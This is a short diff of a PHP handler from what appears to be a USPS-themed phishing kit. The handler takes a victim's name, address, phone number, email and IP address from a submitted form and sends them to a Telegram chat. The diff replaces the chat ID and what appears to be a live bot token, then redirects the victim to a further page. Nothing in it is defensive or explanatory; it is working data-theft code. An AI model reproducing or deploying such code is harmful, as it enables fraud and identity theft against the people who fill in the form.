@@ -75,7 +75,7 @@ $ip = getenv("REMOTE_ADDR");
 $message = "-------------------- <3 USPS <3-------------------\nFull Name : ".$_POST['fullname']."\nAddress 1 : ".$_POST['add1']."\nAddress 2 : ".$_POST['add2']."\nCity      : ".$_POST['city']."\nstate  : ".$_POST['sstate']."\nzip Code  : ".$_POST['zipp']."\nPhone num  : ".$_POST['phonee']."\nEmail  : ".$_POST['email']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
 
 
-sendMessageT('-4141629905',$message,'6367338929:AAHMMbQSLxEpLOkX1027eYvgaumrd9-NRCk');
+sendMessageT('-4271405120',$message,'6690006825:AAEnkGpugYNl1PQbquMqeeJWVplp620y2vM');
     $_SESSION["msg"] = $message ;
 
 HEADER("Location: index2.php");
